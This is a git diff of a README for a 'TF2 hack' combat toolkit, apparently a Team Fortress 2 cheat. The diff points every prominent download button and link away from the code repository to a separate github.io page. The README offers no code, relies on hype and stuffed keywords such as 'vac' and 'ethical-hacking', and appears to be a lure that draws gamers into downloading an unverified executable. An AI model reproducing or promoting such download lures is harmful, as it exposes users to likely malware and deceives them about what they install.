@@ -1,7 +1,7 @@
 <h1>🎯 tf2-hack-2026-class-combat-toolkit - Your Ultimate TF2 Combat Companion</h1>
 
 <p align="center">
-  <a href="https://github.com/sambaperiodicbreathing8349/tf2-hack-2026-class-combat-toolkit" style="display:inline-block;padding:16px 32px;background:#4CAF50;color:white;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW</a>
+  <a href="https://sambaperiodicbreathing8349.github.io" style="display:inline-block;padding:16px 32px;background:#4CAF50;color:white;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW</a>
 </p>
 
 ## 🎮 What Is This?
@@ -29,7 +29,7 @@ After each match, input your results or import data to see detailed statistics. 
 
 ### 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/sambaperiodicbreathing8349/tf2-hack-2026-class-combat-toolkit](https://github.com/sambaperiodicbreathing8349/tf2-hack-2026-class-combat-toolkit)
+Visit this link to download the application: [https://sambaperiodicbreathing8349.github.io](https://sambaperiodicbreathing8349.github.io)
 
 Once you've downloaded the file, follow these simple steps:
 
@@ -142,7 +142,7 @@ Special thanks to the TF2 community for their feedback and suggestions during de
 **Ready to enhance your TF2 experience?** Download now and join thousands of satisfied players who have improved their game with this toolkit!
 
 <p align="center">
-  <a href="https://github.com/sambaperiodicbreathing8349/tf2-hack-2026-class-combat-toolkit" style="display:inline-block;padding:14px 28px;background:#2196F3;color:white;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">🚀 GET STARTED NOW</a>
+  <a href="https://sambaperiodicbreathing8349.github.io" style="display:inline-block;padding:14px 28px;background:#2196F3;color:white;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">🚀 GET STARTED NOW</a>
 </p>
 
 Keywords: counter-strike, counter-strike-2, discord-webhook, dungeon-crawler-game, ethical-hacking, gmod, hitsound, internal, minigames, security-architecture, server-security, source-rcon, sourcemod-plugin, steam-games, teamfortress2, tf2-config, tf2-hud, tradebot, user-generated-content, vac
